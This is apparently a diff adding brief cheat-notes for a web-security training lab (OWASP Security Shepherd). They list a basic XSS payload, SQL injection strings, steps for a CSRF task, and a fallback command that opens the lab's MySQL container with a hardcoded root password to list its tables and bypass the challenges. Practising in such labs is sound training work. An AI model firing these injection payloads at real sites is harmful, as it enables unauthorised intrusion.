@@ -1,0 +1,25 @@
+1.  XSS (cross site scripting)
+try below
+<img src='#' onerror="alert('xss')">
+
+2.  sql injection
+try below
+' OR '1'='1
+" OR "1"="1
+
+3. csrf
+copy the ip:port in the box in the last
+append get path from above (shown in purple colour after GET)
+replace the exampleId by what id you will get there (between the GET and that box , shown in purple colour number)
+
+
+//backup docker for safety (try this if nothing works)
+
+docker exec -it sclab-s2-mysql mysql -u root --password=CowSaysMoo -e "
+SELECT table_schema, table_name
+FROM information_schema.tables
+WHERE table_schema NOT IN ('mysql','information_schema','performance_schema','sys');"
+
+docker exec -it sclab-s2-mysql mysql -u root --password=CowSaysMoo -e "SHOW DATABASES;"
+
+https://github.com/sahinyes/owasp-shepherd-writeups
